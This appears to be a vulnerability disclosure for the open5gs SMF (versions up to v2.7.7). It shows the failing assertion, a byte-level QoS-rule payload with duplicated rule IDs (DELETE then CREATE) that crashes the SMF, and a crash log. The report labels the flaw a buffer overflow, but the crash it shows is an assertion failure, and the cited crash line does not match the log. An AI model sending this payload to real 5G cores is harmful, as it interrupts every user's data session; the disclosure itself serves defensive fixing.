# CVE Information

Vendor: open5gs (https://open5gs.org)

Affected Product: open5gs SMF (Session Management Function)

Affected Version: <= v2.7.7

Vulnerability Type: Buffer Overflow

Impact: Denial of Service (DoS)

Attack Vector: Remote (requires gNB connection)
## Proof of Concept (PoC)
Since the vulnerability is triggered in the deeper layers of the GMM procedure, where the UE's Authentication Response needs to calculate the RES* field using the random number sent by the core network in the current registration (no key is required, and any valid IMSI can complete this), it is not possible to provide a hardcoded PoC. Here, the trigger process is illustrated through root cause analysis, a sample packet capture, and a screenshot of the trigger.

Vulnerable code (src/smf/gsm-handler.c:510-513):
```c
 if (pfcp_flags & OGS_PFCP_MODIFY_REMOVE) {
      ogs_assert((pfcp_flags &
                  (OGS_PFCP_MODIFY_TFT_NEW|OGS_PFCP_MODIFY_TFT_ADD|
                  OGS_PFCP_MODIFY_TFT_REPLACE|OGS_PFCP_MODIFY_TFT_DELETE|
                  OGS_PFCP_MODIFY_QOS_MODIFY)) == 0); // crash point
```


Steps to reproduce
1. Complete normal registration + PDU session establishment (QFI=1 already exists)
2. Send a Modification Request carrying invalid QosRules
```rust
let rule0: Vec<u8> = vec![
    0x01,              // QoS rule identifier = 1
    0x00, 0x01,        // Length of QoS rule = 1
    0x40,              // op = DELETE(010), DQR=0, num_filters=0
];

// Rule[1]: CREATE, Rule ID = 1 again
let rule1: Vec<u8> = vec![
    0x01,              // QoS rule identifier = 1, intentionally duplicated
    0x00, 0x0E,        // Length of QoS rule = 14 bytes

    0x21,              // op = CREATE(001), DQR=0, num_filters=1

    // Packet filter[0]
    0x20,              // direction = uplink(10), packet filter id = 0

    0x09,              // Length of packet filter contents = 9

    // Packet filter component
    0x10,              // IPv4 remote address
    0xC0, 0xA8, 0x01, 0x01,  // 192.168.1.1
    0xFF, 0xFF, 0xFF, 0x00,  // 255.255.255.0

    // QoS rule attributes
    0x01,              // Precedence = 1
    0x01,              // Segregation=0, QFI=1
];

```
3. When the SMF processes the messgae, SMF process terminates, causing all PDU sessions to be interrupted.


  UE → gNB → AMF → SMF
  NAS PDU Session Modification Request
  → Nsmf_PDUSession_UpdateSMContext (SBI)
  → gsm_handle_pdu_session_modification_request()
  → gsm_handle_pdu_session_modification_qos_flow_descriptions()



Vulnerable packet:
	in appendix

Screen shot:
<img width="2058" height="650" alt="f18610a4ce5c1e2df338bd6d69dc9d14" src="https://github.com/user-attachments/assets/d4ef292b-6d32-4fbf-8d32-18a4eefc0f19" />




## Description
In Open5GS, when a single PDU Session Modification Request contains two QoS Rules that operate on the same Rule Identifier, with one performing a DELETE operation and the other performing a CREATE operation, the SMF may set both the MODIFY_REMOVE and MODIFY_TFT_NEW flags in pfcp_flags, which subsequently causes the SMF to crash.

### Reference
- https://github.com/open5gs/open5gs/issues/4511

### Log File

```text
05/02 07:01:54.108: [amf] INFO: [imsi-999700000000007:1:11][0:0:NULL] /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify (../src/amf/nsmf-handler.c:954)
05/02 07:02:08.879: [scp] INFO: Setup NF EndPoint(addr) [127.0.0.4:7777] (../src/scp/sbi-path.c:463)
05/02 07:02:08.880: [gsm] FATAL: gsm_handle_pdu_session_modification_qos_rules: Assertion `reconfigure_packet_filter(pf, &qos_rule[i], i) > 0' failed. (../src/smf/gsm-handler.c:274)
05/02 07:02:08.881: [core] FATAL: backtrace() returned 11 addresses (../lib/core/ogs-abort.c:37)
./bin/open5gs-smfd(+0xba573) [0x563cee856573]
./bin/open5gs-smfd(+0xbb93b) [0x563cee85793b]
./bin/open5gs-smfd(+0x35ea9) [0x563cee7d1ea9]
/home/xiaoyugan/5G/open5gs_test/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7fde30d972de]
./bin/open5gs-smfd(+0x2ed88) [0x563cee7cad88]
/home/xiaoyugan/5G/open5gs_test/install/lib/x86_64-linux-gnu/libogscore.so.2(ogs_fsm_dispatch+0x113) [0x7fde30d972de]
./bin/open5gs-smfd(+0x11e81) [0x563cee7ade81]
/home/xiaoyugan/5G/open5gs_test/install/lib/x86_64-linux-gnu/libogscore.so.2(+0x12960) [0x7fde30d87960]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x8609) [0x7fde2fdfa609]
/lib/x86_64-linux-gnu/libc.so.6(clone+0x43) [0x7fde2fd1f353]
05/02 07:02:09.094: [sbi] WARNING: Couldn't connect to server (7): Failed to connect to 127.0.0.4 port 7777: Connection refused (../lib/sbi/client.c:767)
05/02 07:02:09.094: [scp] WARNING: response_handler() failed [-1] (../src/scp/sbi-path.c:678)
05/02 07:02:09.095: [amf] ERROR: [1:0] No SmContextUpdateError [500] (../src/amf/nsmf-handler.c:991)
05/02 07:02:14.712: [nrf] WARNING: [fbfd5db4-462e-41f1-beb9-b3f9c5c1e942] No heartbeat (../src/nrf/nrf-sm.c:288)
05/02 07:02:14.712: [nrf] INFO: [fbfd5db4-462e-41f1-beb9-b3f9c5c1e942] NF de-registered (../src/nrf/nf-sm.c:220)
05/02 07:02:14.713: [sbi] INFO: [fbfd5db4-462e-41f1-beb9-b3f9c5c1e942] (NRF-notify) NF_DEREGISTERED event [type:SMF] (../lib/sbi/nnrf-handler.c:1191)
05/02 07:02:14.713: [scp] INFO: Setup NF EndPoint(addr) [127.0.0.5:7777] (../src/scp/sbi-path.c:463)
05/02 07:02:14.714: [sbi] INFO: [fbfd5db4-462e-41f1-beb9-b3f9c5c1e942] (NRF-notify) NF_DEREGISTERED event [type:SMF] (../lib/sbi/nnrf-handler.c:1191)
05/02 07:02:17.856: [amf] WARNING: Implicit NG release (../src/amf/amf-sm.c:1074)
05/02 07:02:17.857: [amf] WARNING:     RAN_UE_NGAP_ID[1] AMF_UE_NGAP_ID[20] (../src/amf/amf-sm.c:1075)
05/02 07:02:17.857: [amf] INFO: UE Context Release [Action:1] (../src/amf/ngap-handler.c:1827)

```



